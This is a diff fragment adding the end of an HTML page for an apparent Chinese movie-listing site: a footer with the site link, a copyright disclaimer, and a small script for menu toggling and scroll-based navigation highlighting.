+      <p>网站地址：<a href="https://seyouyoudianyingwang-h5.github.io">https://seyouyoudianyingwang-h5.github.io</a></p>
+      <p style="margin-top:6px;font-size:.68rem;opacity:.6">本站内容仅供学习交流，所有影片信息来自互联网公开数据，如有侵权请联系删除。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn');
+var topNav=document.getElementById('topNav');
+menuBtn.addEventListener('click',function(){topNav.classList.toggle('open')});
+topNav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){topNav.classList.remove('open')})});
+var sections=document.querySelectorAll('section[id],div[id]');
+window.addEventListener('scroll',function(){
+  var scrollY=window.scrollY+80;
+  sections.forEach(function(sec){
+    var top=sec.offsetTop,height=sec.offsetHeight,id=sec.getAttribute('id');
+    if(scrollY>=top&&scrollY<top+height){
+      document.querySelectorAll('.topnav a').forEach(function(a){a.classList.remove('active')});
+      var activeLink=document.querySelector('.topnav a[href="#'+id+'"]');
+      if(activeLink)activeLink.classList.add('active');
+    }
+  });
+});
+</script>
+
+</body>
+</html>
